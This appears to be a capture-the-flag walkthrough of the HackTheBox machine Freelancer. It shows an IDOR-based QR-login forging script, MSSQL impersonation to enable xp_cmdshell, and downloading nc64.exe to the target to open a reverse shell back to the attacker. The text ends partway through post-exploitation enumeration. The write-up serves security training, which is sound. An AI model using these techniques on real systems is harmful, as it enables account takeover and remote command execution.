---
title: HTB: Freelancer
url: https://0xdf.gitlab.io/2024/10/05/htb-freelancer.html
date: 2024-10-05T13:45:00+00:00
difficulty: Hard [40]
os: Windows
tags: htb-freelancer, hackthebox, ctf, nmap, windows, netexec, feroxbuster, django, qr-code, zbarimg, idor, mssql, mssql-impersonate, password-spray, runascs, memory-dump, memprocfs, lsa-secrets, secretsdump, bloodhound, rbcd, windbg, mimikatz, mimilib, htb-support, htb-blackfield
---

![Freelancer](/img/freelancer-cover.png)

Freelancer starts off by abusing the relationship between two Django websites, followed by abusing an insecure direct object reference in a QRcode login to get admin access. From there, I’ll use impersonation in the MSSQL database to run commands as the sa account, enabling xp\_cmdshell and getting execution. I’ll find MSSQL passwords to pivot to the next user. This user has a memory dump which I’ll analyze with MemProcFS to find another password in LSA Secrets. Bloodhound shows this user is in a group with GenericWrite privileges over the DC, which I’ll abuse with resource-based constrained delegation to get domain hashes and a shell as administrator. In Beyond Root, I’ll show an altnerative path using WinDbg to on the dump to find another password, and spraying variations of it to get passwords for a bunch of users, some of whom are also in the group with privileges necessary to exploit the DC.

## Box Info

| Name | [Freelancer](https://hackthebox.com/machines/freelancer)  [Freelancer](https://hackthebox.com/machines/freelancer) [Play on HackTheBox](https://hackthebox.com/machines/freelancer) |
| --- | --- |
| Release Date | [01 Jun 2024](https://twitter.com/hackthebox_eu/status/1796157124055089191) |
| Retire Date | 05 Oct 2024 |
| OS | Windows Windows |
| Base Points | Hard [40] |
| Rated Difficulty | Rated difficulty for Freelancer |
| Radar Graph | Radar chart for Freelancer |
| First Blood User | 01:50:42[xct xct](https://app.hackthebox.com/users/13569) |
| First Blood Root | 02:50:03[NLTE NLTE](https://app.hackthebox.com/users/260094) |
| Creator | [Spectra199 Spectra199](https://app.hackthebox.com/users/414823) |

## Recon

### nmap

`nmap` finds many open TCP ports:

```

oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.5
Starting Nmap 7.80 ( https://nmap.org ) at 2024-06-05 12:00 EDT
Nmap scan report for 10.10.11.5
Host is up (0.10s latency).
Not shown: 65509 closed ports
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49671/tcp open  unknown
49674/tcp open  unknown
49679/tcp open  unknown
49698/tcp open  unknown
55297/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 8.89 seconds
oxdf@hacky$ nmap -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49669,49670,49671,49674,49679,49698,55297 -sCV 10.10.11.5
Starting Nmap 7.80 ( https://nmap.org ) at 2024-06-05 12:01 EDT
Nmap scan report for 10.10.11.5
Host is up (0.10s latency).

PORT      STATE  SERVICE       VERSION
53/tcp    open   tcpwrapped
80/tcp    open   http          nginx 1.25.5
|_http-server-header: nginx/1.25.5
|_http-title: Did not follow redirect to http://freelancer.htb/
88/tcp    closed kerberos-sec
135/tcp   open   msrpc         Microsoft Windows RPC
139/tcp   open   netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open   ldap          Microsoft Windows Active Directory LDAP (Domain: freelancer.htb0., Site: Default-First-Site-Name)
445/tcp   open   microsoft-ds?
464/tcp   closed kpasswd5
593/tcp   open   ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open   tcpwrapped
3268/tcp  open   ldap          Microsoft Windows Active Directory LDAP (Domain: freelancer.htb0., Site: Default-First-Site-Name)
3269/tcp  open   tcpwrapped
5985/tcp  open   http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open   mc-nmf        .NET Message Framing
47001/tcp open   http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open   msrpc         Microsoft Windows RPC
49665/tcp open   msrpc         Microsoft Windows RPC
49666/tcp open   msrpc         Microsoft Windows RPC
49667/tcp open   msrpc         Microsoft Windows RPC
49669/tcp open   msrpc         Microsoft Windows RPC
49670/tcp open   ncacn_http    Microsoft Windows RPC over HTTP 1.0
49671/tcp open   msrpc         Microsoft Windows RPC
49674/tcp open   msrpc         Microsoft Windows RPC
49679/tcp open   msrpc         Microsoft Windows RPC
49698/tcp open   tcpwrapped
55297/tcp open   ms-sql-s      Microsoft SQL Server  15.00.2000.00
| ms-sql-ntlm-info:
|   Target_Name: FREELANCER
|   NetBIOS_Domain_Name: FREELANCER
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: freelancer.htb
|   DNS_Computer_Name: DC.freelancer.htb
|   DNS_Tree_Name: freelancer.htb
|_  Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2024-06-06T00:23:48
|_Not valid after:  2054-06-06T00:23:48
|_ssl-date: 2024-06-06T00:29:03+00:00; +8h26m03s from scanner time.
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 8h26m02s, deviation: 0s, median: 8h26m01s
| ms-sql-info:
|   Windows server name: DC
|   10.10.11.5\SQLEXPRESS:
|     Instance name: SQLEXPRESS
|     Version:
|       name: Microsoft SQL Server
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server
|     TCP port: 55297
|     Named pipe: \\10.10.11.5\pipe\MSSQL$SQLEXPRESS\sql\query
|_    Clustered: false
| smb2-security-mode:
|   2.02:
|_    Message signing enabled and required
| smb2-time:
|   date: 2024-06-06T00:28:48
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 192.34 seconds

```

The domain `freelancer.htb` and the hostname `dc` leak throughout the results. It’s interesting to see MSSQL running on 55297. There’s not much else here. I’ll triage the ports to enumerate as follows:
- Tier 1: HTTP (80), SMB (445)
- Tier 2: DNS, LDAP
- Tier 3: Kerberos brute force
- With creds: WinRM (5985), MSSQL (55297)

I’ll try using `ffuf` to fuzz subdomains on the webserver (on 80), but it doesn’t find anything, and generates a lot of 503 (server unavailable) responses. I’ll add what I have so far to my `/etc/hosts` file:

```
10.10.11.5 freelancer.htb dc.freelancer.htb dc

```

### SMB - TCP 445

The guest account is disabled, and junk accounts return `STATUS_LOGON_FAILURE`:

```

oxdf@hacky$ netexec smb freelancer.htb -u guest -p ''
SMB         10.10.11.5      445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:freelancer.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.5      445    DC               [-] freelancer.htb\guest: STATUS_ACCOUNT_DISABLED 
oxdf@hacky$ netexec smb freelancer.htb -u oxdf -p ''
SMB         10.10.11.5      445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:freelancer.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.5      445    DC               [-] freelancer.htb\oxdf: STATUS_LOGON_FAILURE 
oxdf@hacky$ netexec smb freelancer.htb -u oxdf -p junk
SMB         10.10.11.5      445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:freelancer.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.5      445    DC               [-] freelancer.htb\oxdf:junk STATUS_LOGON_FAILURE

```

Without auth, I’m not able to list shares or do anything else interesting:

```

oxdf@hacky$ netexec smb freelancer.htb --shares
SMB         10.10.11.5      445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:freelancer.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.5      445    DC               [-] Error getting user: list index out of range
SMB         10.10.11.5      445    DC               [-] Error enumerating shares: STATUS_USER_SESSION_DELETED

```

### freelancer - TCP 80

#### Site

The site is for a jobs platform:

![image-20240607121244635](/img/image-20240607121244635.png)
[![expand](/icons/expand.png)](javascript:void(0) "Click to expand for full content")

There’s a signup for a newsletter link, but the submit button doesn’t send any HTTP requests. There’s an email address, `support@freelancer.htb`.

There’s a lot to the site. Many of the features require login. There are two different registration forms, for both job seekers and employers.

#### Employer Account

The form to register as a employer has this notice at the top:

![image-20240607133521310](/img/image-20240607133521310.png)

In addition to name, email, username, the form also asks for security questions:

![image-20240607133636865](/img/image-20240607133636865.png)

I’ll create an account, and when I try to log in, it fails:

![image-20240607133757801](/img/image-20240607133757801.png)

I’ll need to figure out how to activate the account.

#### Freelancer Account

I’ll register a freelancer account. I can’t use the same username or email I used with my employer account, as it’s already taken. I also need to provide security questions. On succeeding, I’m redirected to the login page, and on logging in, to `/job/search`:

![image-20240607134117210](/img/image-20240607134117210.png)
[![expand](/icons/expand.png)](javascript:void(0) "Click to expand for full content")

I’m able to view jobs, and clicking “Apply for job” just returns:

![image-20240607134225892](/img/image-20240607134225892.png)

There’s a contact form on the authenticated site that does send data. It looks like it might be monitored, but some simple XSS payloads never contact me:

![image-20240607134346409](/img/image-20240607134346409.png)

#### Tech Stack

The headers don’t give much more information besides nginx:

```

HTTP/1.1 200 OK
Server: nginx/1.25.5
Date: Fri, 07 Jun 2024 21:12:10 GMT
Content-Type: text/html; charset=utf-8
Connection: close
Vary: Accept-Encoding
Cross-Origin-Opener-Policy: same-origin
Referrer-Policy: same-origin
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Content-Length: 57293

```

I’m not able to guess at any `index` extensions.

The 404 page is custom to the site as well:

![image-20240607135341666](/img/image-20240607135341666.png)
[![expand](/icons/expand.png)](javascript:void(0) "Click to expand for full content")

Wappalyzer does identify the site as running the Python Django framework:

![image-20240607140516491](/img/image-20240607140516491.png)

#### Directory Brute Force

I’ll run `feroxbuster` against the site, but it doesn’t work well. It starts by showing a bunch of 503s, which it eventually starts filtering. Then there’s a ton of 302s. There’s a `/admin`, but everything inside `/admin/` seems to redirect to `http://freelancer.htb/admin/login/?next=/admin/[whatever]`. I’ll run again with `-n` to not recurse and `-C 503` to filter 503 responses, and the results are more useful:

```

oxdf@hacky$ feroxbuster -n -u http://freelancer.htb -C 503

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://freelancer.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 💢  Status Code Filters   │ [503]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🚫  Do Not Recurse        │ true
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET      334l      690w    12238c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        0l        0w        0c http://freelancer.htb/admin => http://freelancer.htb/admin/
200      GET     1247l     2523w    57293c http://freelancer.htb/
301      GET        0l        0w        0c http://freelancer.htb/blog => http://freelancer.htb/blog/
[####################] - 2m     30000/30000   0s      found:3       errors:0      
[####################] - 2m     30000/30000   205/s   http://freelancer.htb/

```

`/admin` is the interesting part. Visiting it just asks for auth again:

![image-20240607135101323](/img/image-20240607135101323.png)

That login form looks very similar to the Django admin login form.

## Shell as sql\_svc

### Employer Site Access

#### Freelancer Login

The login form is an interesting area to attack on this site. There’s a shared login form for both the employer and freelancer accounts:

![image-20240607140715595](/img/image-20240607140715595.png)

The “Forgot your password” link leads to a form asking the security questions:

![image-20240607140817623](/img/image-20240607140817623.png)

It’s interesting that it says that answering the questions will reset the password *and* reactivate the account.

#### Activate Employer Account

I’ll use the “forgot password” form with the account I registered as an employer. On answering the questions correctly, it returns a password reset form:

![image-20240607141140315](/img/image-20240607141140315.png)

After resetting the password, I’m able to log in as the employer:

![image-20240607141219855](/img/image-20240607141219855.png)

### Site Admin Access

#### QR-Code

There’s a QR-Code option on the left menu bar. Clicking it generates a short-lived QR-Code that can be used to login from a mobile device:

![image-20240607141330084](/img/image-20240607141330084.png)

I’ll download the image and decode it:

```

oxdf@hacky$ zbarimg qrcode.png 
QR-Code:http://freelancer.htb/accounts/login/otp/MTAwMTA=/71c40e88da186a5d53afe78b585f1382/
scanned 1 barcode symbols from 1 images in 0 seconds

```

Visiting that URL in a private browsing window (so no cookies from being logged in) immediately leads to my profile:

![image-20240607141728973](/img/image-20240607141728973.png)

The HTTP response is a 302 redirect to `/accounts/profile/` that also sets the session cookie:

```

HTTP/1.1 302 Found
Server: nginx/1.25.5
Date: Fri, 07 Jun 2024 23:16:22 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 0
Connection: close
Cross-Origin-Opener-Policy: same-origin
Location: /accounts/profile/
Referrer-Policy: same-origin
Set-Cookie: csrftoken=M9wSpEqf2qC0Dc9ChYwN0vA7kcE3Ixcm; expires=Fri, 06 Jun 2025 23:16:22 GMT; Max-Age=31449600; Path=/; SameSite=Lax
Set-Cookie: sessionid=uixwzlzp885e24ufsex32y88cs2v3oou; expires=Fri, 21 Jun 2024 23:16:22 GMT; HttpOnly; Max-Age=1209600; Path=/; SameSite=Lax
Vary: Cookie
X-Content-Type-Options: nosniff
X-Frame-Options: DENY

```

Visiting after 5 minutes returns:

![image-20240607141545250](/img/image-20240607141545250.png)

The source for the qr-code is actually to a dynamic endpoint to generate qr-codes:

![image-20240607142256110](/img/image-20240607142256110.png)

With the session cookie, it can be downloaded directly:

```

oxdf@hacky$ curl http://freelancer.htb/accounts/otp/qrcode/generate/ -b 'sessionid=uixwzlzp885e24ufsex32y88cs2v3oou' -o-
PNG

IHDRTcIDATx]8FOyt.`fR
                     c7R'f4=J*U2kE
                                  2 
                                    2 
` O`1@M7d'yKK76c;f߉TPaMeg       X2Obxt-hoIAޝ OXsXH3
izgȞ:+mQmˇ<XAZU?.P˖ l(6ߴՌ!l(Ƚ܆Z쌚           ~=  _3I=n|*Ω&@b}AG/jH$IIҘ$Q-3z%IRZ\I껙:WFh>Aޏl~9$w<:4ZSP;X6;K j9 d'N'IV^dSO
                                 jQ
VoFS"iޙO[{(PGy5W3IXVջX`WŎXAg-xQ;m~(ȣ>}=s<#k(CAި֩nmP72iex#ȃ^bʳgA~}N}
*ENd]Ի}]Owu5{An}lT06(6eoQ:F끭oz$պݾ>Ub/lFn~lMjHÙ60e+>gw$R"b0MK<yPg+,HW(Zrs5u{bZzXk=g#9םg$1!D[f߂;>CicRAbPW1f`jGOYы=g#M/gdAd߄JJ.IENDB`

```

That binary junk starts with the [magic bytes](https://en.wikipedia.org/wiki/List_of_file_signatures) for a PNG image.

#### IDOR

Looking more closely at the URL from the QR-Code, there are two pirces of data. I’ll call them the base64 element and the hex element, leaving the URL format as `http://freelancer.htb/accounts/login/otp/[base64]/[hex]/`.
- The base64 element, such as `MTAwMTA=`, seems to be the same for every URL generated by my account, but changes when I log into a different account.
- The hex element, such as `71c40e88da186a5d53afe78b585f1382`, changes for each QR generated.

The base64 element decodes to a number:

```

oxdf@hacky$ echo MTAwMTA= | base64 -d
10010

```

I registered my freelancer account just after my employer account, so it is likely 10011. I’ll encode that ID:

```

oxdf@hacky$ echo 10011 | base64
MTAwMTEK    

```

I’ll visit an updated link replacing the base64-encoded data with the new ID, and it shows the profile of my freelancer account:

![image-20240607143445689](/img/image-20240607143445689.png)

This access suggests that as long as I have a valid hex element, it means I can log in as any user just by knowing their ID.

#### Find User Ids

For the sake of playing with this, I’ll make a quick Bash script to take in a user ID and generate a new link:

```

#!/bin/bash

if [ $# -ne 2 ]; then
    echo "Usage: $0 <session_cookie> <id>";
    exit
fi  

curl http://freelancer.htb/accounts/otp/qrcode/generate/ -b "sessionid=$1" -o- -s |
    zbarimg - 2>&1 |
    grep QR | cut -d: -f2- |
    sed "s/MTAwMTA=/$(echo ${2} | base64 -w0)/"

```

This gets the image URL for my account, decodes it, gets the URL, and replaces with `sed` my ID with the ID for the user I want to impersonate.

Trying user id 10000 returns invalid:

```

oxdf@hacky$ ./getlink.sh uixwzlzp885e24ufsex32y88cs2v3oou 10000
http://freelancer.htb/accounts/login/otp/MTAwMDAK/501eb3087fb7c7a3c9667728aa10f2c6/
oxdf@hacky$ curl $(./getlink.sh uixwzlzp885e24ufsex32y88cs2v3oou 10000)
Invalid user primary key!

```

Same with 10001 and 10002. I need to fuzz here. A quick `bash` loops seems safest:

```

oxdf@hacky$ for i in $(seq 10000 10100); do curl -I $(./getlink.sh uixwzlzp885e24ufsex32y88cs2v3oou ${i}) -s | grep -q "sessionid" && echo "Found valid user: $i"; done
Found valid user: 10010
Found valid user: 10011

```

It only finds my two accounts. I’ll try looking at low IDs starting with 0:

```

oxdf@hacky$ for i in $(seq 0 100); do curl -I $(./getlink.sh uixwzlzp885e24ufsex32y88cs2v3oou ${i}) -s | grep -q "sessionid" && echo "Found valid user: $i"; done  
Found valid user: 2                                               
Found valid user: 3                                               
Found valid user: 4
Found valid user: 5
Found valid user: 6
Found valid user: 7
Found valid user: 8
Found valid user: 9
Found valid user: 10
Found valid user: 11
Found valid user: 12
Found valid user: 13
Found valid user: 14

```

There’s a bunch more users!

#### Identify Admin User

The user with id 2 has the username “admin”:

![image-20240607145012104](/img/image-20240607145012104.png)

While logged in as admin, visiting `/admin` returns the admin dashboard:

![image-20240607145055171](/img/image-20240607145055171.png)

#### Admin Enumeration

Looking around the admin panel, there’s a list of email addresses under “Custom users”:

![image-20240607150914148](/img/image-20240607150914148.png)

“Employers” and “Freelancers” has the same emails broken into two groups.

The most interesting link is the “SQL Terminal” at the bottom of the right list, which opens a text area:

![image-20240607151106841](/img/image-20240607151106841.png)

I can try a query, and the results show up below:

![image-20240607151134505](/img/image-20240607151134505.png)

The query errors, but (a) the SQL Terminal works, and (b) it shows that it’s MSSQL Server.

#### DB Enumeration

There is only one custom DB from `select name, database_id from sys.databases;`:

![image-20240607151546786](/img/image-20240607151546786.png)

I’ll run `select name from sys.tables;` to list the tables:

![image-20240607151742285](/img/image-20240607151742285.png)

There’s nothing really interesting in the current database (which seems to be the `Freelancer_webapp_DB`).

### RCE Via MSSQL

#### xp\_cmdshell Disabled

The first thing to try on an MSSQL DB is running commands with `xp_cmdshell`:

![image-20240607152325525](/img/image-20240607152325525.png)

It’s disabled. I can try to enable it:

![image-20240607152430923](/img/image-20240607152430923.png)

The current user doesn’t have permissions.

#### DB Permissions

The application is currently running as Freelancer\_webapp\_user:

![image-20240607152518684](/img/image-20240607152518684.png)

The DB users are stored in `sys.server_principals` ([docs](https://learn.microsoft.com/en-us/sql/relational-databases/system-catalog-views/sys-server-principals-transact-sql?view=sql-server-ver16&tabs=sql)). For some reason trying to `select * from sys.server_principals;` returns a 500 error and no update to the output, but limiting the selection works:

![image-20240607152956355](/img/image-20240607152956355.png)

There’s a bunch of information also in the `sys.server_permissions` table (which does allow a `select * from`). It has a `grantee_principal_id` and a `grantor_principal_id`.

Scrolling through the table, the most interesting `permission_name` that jumps out is “IMPERSONATE”.

![image-20240607153323703](/img/image-20240607153323703.png)

User 267 (Freelancer\_webapp\_user) has been granted `IMPERSONATE` by user 1 (sa).

[This Microsoft document](https://learn.microsoft.com/en-us/sql/t-sql/statements/execute-as-transact-sql?view=sql-server-ver16) describes how the `EXECUTE AS` statement can be used where this permission is granted to run commands as the grantor. It works:

![image-20240607153920813](/img/image-20240607153920813.png)

#### xp\_cmdshell Success

With access to `EXECUTE AS` for the sa (administrator) user, I’ll enable `xp_cmdshell`:

![image-20240607154041021](/img/image-20240607154041021.png)

No results is a significant improvement over the errors last time. I still can’t run commands as the original user:

![image-20240607155023436](/img/image-20240607155023436.png)

But with impersonation I can:

![image-20240607154213539](/img/image-20240607154213539.png)

There is a cron disabling `xp_cmdshell`, so I found it useful to keep one browser tab for enabling it, and another for enumerating.

A quick check with `whoami /priv` shows this user doesn’t have `SeImpersonatePrivilege`:

![image-20240607154349843](/img/image-20240607154349843.png)

### Reverse Shell

#### Standard Base64 Encoded [Fail]

My first attempt is to grab the PowerShell #3 (Base64) reverse shell from [revshells.com](https://www.revshells.com/) and run it:

![image-20240607155311494](/img/image-20240607155311494.png)

No shell comes back, and the response says it’s blocked by AV.

#### nc.exe Shell

I’ll try hosting `nc64.exe` from my Python webserver and uploading it to Freelancer:

![image-20240607155539209](/img/image-20240607155539209.png)

There’s no output here, but a request at my server is a good sign:

```
10.10.11.5 - - [07/Jun/2024 12:28:53] "GET /nc64.exe HTTP/1.1" 200 -

```

Doing a directory listing shows it’s there:

![image-20240607155626632](/img/image-20240607155626632.png)

I’ll trigger it to get a shell:

![image-20240607155708985](/img/image-20240607155708985.png)

It hangs, but at my listening `nc`:

```

oxdf@hacky$ rlwrap -cAr nc -lvnp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.5 63819
Microsoft Windows [Version 10.0.17763.5830]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32> whoami
freelancer\sql_svc

```

I’ll will also switch to PowerShell:

```

C:\WINDOWS\system32> powershell                       
Windows PowerShell                                                
Copyright (C) Microsoft Corporation. All rights reserved.
PS C:\WINDOWS\system32> 

```

I’ll note the intended path for this box was not to be able to get this shell, but rather do the enumeration through MSSQL, up through the next shell.

## Shell as mikasaAckerman

### Enumeration

#### Web

In the root of `C:`, there are two directories, `apps` and `nginx` that are non-standard:

```

PS C:\> ls

    Directory: C:\

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        5/24/2024   7:30 PM                apps
d-----         6/3/2024  10:50 AM                nginx
d-----        5/28/2024  11:47 AM                PerfLogs
d-r---        5/28/2024   2:18 PM                Program Files
d-----        5/28/2024   2:18 PM                Program Files (x86)
d-----        5/27/2024   7:50 AM                temp
d-r---        5/28/2024  10:19 AM                Users
d-----        5/28/2024  11:50 AM                Windows

```

sql\_svc can’t access `apps`. `nginx` has the webserver information:

```

PS C:\nginx> ls

    Directory: C:\nginx

Mode                LastWriteTime         Length Name                                                                       
----                -------------         ------ ----                                                                       
d-----        5/23/2024   7:24 PM                conf                                                                       
d-----        5/23/2024   6:45 PM                contrib                                                                    
d-----        5/23/2024   6:45 PM                docs                                                                       
d-----        5/23/2024   6:45 PM                html                                                                       
d-----        5/23/2024   7:26 PM                logs                                                                       
d-----        5/24/2024   2:36 PM                sites-available                                                            
d-----        5/24/2024   2:36 PM                sites-enabled                                                              
d-----        5/23/2024   6:45 PM                temp                                                                       
-a----        4/16/2024   7:01 PM        4716544 nginx.exe                                                                  
-a----         6/3/2024  10:50 AM            263 start.bat 

```

In `sites-enabled`, there’s a config that’s proxying through to the application on TCP 8000:

```

PS C:\nginx\sites-enabled> ls

    Directory: C:\nginx\sites-enabled

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        5/24/2024   2:36 PM            773 freelancer.conf

PS C:\nginx\sites-enabled> cat freelancer.conf
limit_req_zone $binary_remote_addr zone=mylimit:10m rate=50r/s;
server {
    listen      80;
    server_name freelancer.htb;
    charset     utf-8;
    gzip on;
    gzip_types text/plain text/css application/json application/javascript text/xml application/xml application/xml+rss text/javascript;
    gzip_proxied any;
    gzip_vary on;

    location /static/ {
        limit_req zone=mylimit burst=30;
        alias C:/apps/freelancer/freelancer/static/;
    }

    location / {
        limit_req zone=mylimit burst=30;
        proxy_pass http://localhost:8000;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }
}

```

Given the reference to `C:/apps/freelancer` it seems safe to guess that at least that webapp lives in `apps`.

#### Users

There are a handful of users with home directories on the box:

```

PS C:\users> ls

    Directory: C:\users

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         6/5/2024   8:23 PM                Administrator
d-----        5/28/2024  10:23 AM                lkazanof
d-----        5/28/2024  10:23 AM                lorra199
d-----        5/28/2024  10:22 AM                mikasaAckerman
d-----        8/27/2023   1:16 AM                MSSQLSERVER
d-r---        5/28/2024   2:13 PM                Public
d-----        5/28/2024  10:22 AM                sqlbackupoperator
d-----         6/5/2024   8:23 PM                sql_svc

```

sql\_svc’s home directory is mostly empty, except for the `Download\SQLEXPR-2019_x64_ENU` directory:

```

PS C:\users\sql_svc> tree . /f
Folder PATH listing
Volume serial number is 8954-28AE
C:\USERS\SQL_SVC
3D Objects
Contacts
Desktop
Documents
Downloads
   SQLEXPR-2019_x64_ENU
          AUTORUN.INF
          MEDIAINFO.XML
          PackageId.dat
          SETUP.EXE
          SETUP.EXE.CONFIG
          sql-Configuration.INI
          SQLSETUPBOOTSTRAPPER.DLL

       1033_ENU_LP
             MEDIAINFO.XML

          x64
                 README.HTM

              1033
                     LICENSE_DEV.RTF
                     LICENSE_EVAL.RTF
                     LICENSE_EXPR.RTF
                     PYTHONLICENSE.RTF
                     README.HTM
                     ROPENLICENSE.RTF

              Setup
                     CONN_INFO_LOC.MSI
                     SMO_EXTENSIONS_LOC.MSI
                     SMO_LOC.MSI
                     SQLBROWSER.MSI
                     SQLSUPPORT.MSI
                     SQL_COMMON_CORE_LOC.MSI
                     SQL_DMF_LOC.MSI
                     SQL_ENGINE_CORE_INST_LOC.MSI
                     SQL_ENGINE_CORE_SHARED_LOC.MSI
                     SQL_XEVENT_LOC.MSI

                  x64
                          MSODBCSQL.MSI
                          MSOLEDBSQL.MSI
                          SQLNCLI.MSI
                          SQLWRITER.MSI
                          TSQLLANGUAGESERVICE.MSI

       redist
          VisualStudioShell
              VCRuntimes
                      VC_REDIST_X64.EXE
                      VC_REDIST_X86.EXE

       resources
          1033
                  SETUP.RLL

       x64
              ADDNODE.XML
              COMPLETECLUSTERWIZARD.XML
              COMPLETEIMAGEWIZARD.XML
              COMPONENTUPDATE.XML
              CONFIGURATION.UICFG
              EDITIONUPGRADEWIZARD.XML
              FIXSQLREGISTRYKEY_X64.EXE
              FIXSQLREGISTRYKEY_X64.EXE.CONFIG
              FIXSQLREGISTRYKEY_X86.EXE
              FIXSQLREGISTRYKEY_X86.EXE.CONFIG
              INSTALLCLUSTERWIZARD.XML
              INSTALLWIZARD.XML
              INSTAPI150.DLL
              LANDINGPAGE.EXE
              LANDINGPAGE.EXE.CONFIG
              MICROSOFT.ANALYSISSERVICES.ADOMDCLIENT.DLL
              MICROSOFT.ANALYSISSERVICES.CORE.DLL
              MICROSOFT.ANALYSISSERVICES.DLL
              MICROSOFT.ANALYSISSERVICES.SPCLIENT.INTERFACES.DLL
              MICROSOFT.ANALYSISSERVICES.TABULAR.DLL
              MICROSOFT.ANALYSISSERVICES.TABULAR.JSON.DLL
              MICROSOFT.DIAGNOSTICS.TRACING.EVENTSOURCE.DLL
              MICROSOFT.NETENTERPRISESERVERS.EXCEPTIONMESSAGEBOX.DLL
              MICROSOFT.SQL.CHAINER.PACKAGE.DLL
              MICROSOFT.SQL.CHAINER.PACKAGE.XMLSERIALIZERS.DLL
              MICROSOFT.SQL.CHAINER.PACKAGEDATA.DLL
              MICROSOFT.SQL.CHAINER.PRODUCT.DLL
              MICROSOFT.SQL.CHAINER.PRODUCT.XMLSERIALIZERS.DLL
              MICROSOFT.SQLSERVER.CHAINER.EXTENSIONCOMMON.DLL
              MICROSOFT.SQLSERVER.CHAINER.EXTENSIONCOMMON.XMLSERIALIZERS.DLL
              MICROSOFT.SQLSERVER.CHAINER.INFRASTRUCTURE.DLL
              MICROSOFT.SQLSERVER.CHAINER.INFRASTRUCTURE.XMLSERIALIZERS.DLL
              MICROSOFT.SQLSERVER.CHAINER.WORKFLOWDATA.DLL
              MICROSOFT.SQLSERVER.CHAINER.WORKFLOWDATA.XMLSERIALIZERS.DLL
              MICROSOFT.SQLSERVER.CONFIGURATION.AGENTEXTENSION.DLL
              MICROSOFT.SQLSERVER.CONFIGURATION.ASEXTENSION.DLL
              MICROSOFT.SQLSERVER.CONFIGURATION.ASTELEMETRYEXTENSION.DLL
              MICROSOFT.SQLSERVER.CONFIGURATION.BOOTSTRAPEXTENSION.DLL
              MICROSOFT.SQLSERVER.CONFIGURATION.BOOTSTRAPEXTENSION.XMLSERIALIZERS.DLL
              MICROSOFT.SQLSERVER.CONFIGURATION.CLUSTER.DLL
              MICROSOFT.SQLSERVER.CONFIGURATION.CLUSTER.XMLSERIALIZERS.DLL
              MICROSOFT.SQLSERVER.CONFIGURATION.CONFIGEXTENSION.DLL
              MICROSOFT.SQLSERVER.CONFIGURATION.CONFIGEXTENSION.XMLSERIALIZERS.DLL
              MICROSOFT.SQLSERVER.CONFIGURATION.DISTRIBUTEDREPLAYEXTENSION.DLL
              MICROSOFT.SQLSERVER.CONFIGURATION.DLL
              MICROSOFT.SQLSERVER.CONFIGURATION.EXTENSIBILITY_CONFIGEXTENSION.DLL
              MICROSOFT.SQLSERVER.CONFIGURATION.FULLTEXT_CONFIGEXTENSION.DLL
              MICROSOFT.SQLSERVER.CONFIGURATION.IMPY_CONFIGEXTENSION.DLL
              MICROSOFT.SQLSERVER.CONFIGURATION.IMR_CONFIGEXTENSION.DLL
              MICROSOFT.SQLSERVER.CONFIGURATION.INSTALLWIZARD.DLL
              MICROSOFT.SQLSERVER.CONFIGURATION.INSTALLWIZARDFRAMEWORK.DLL
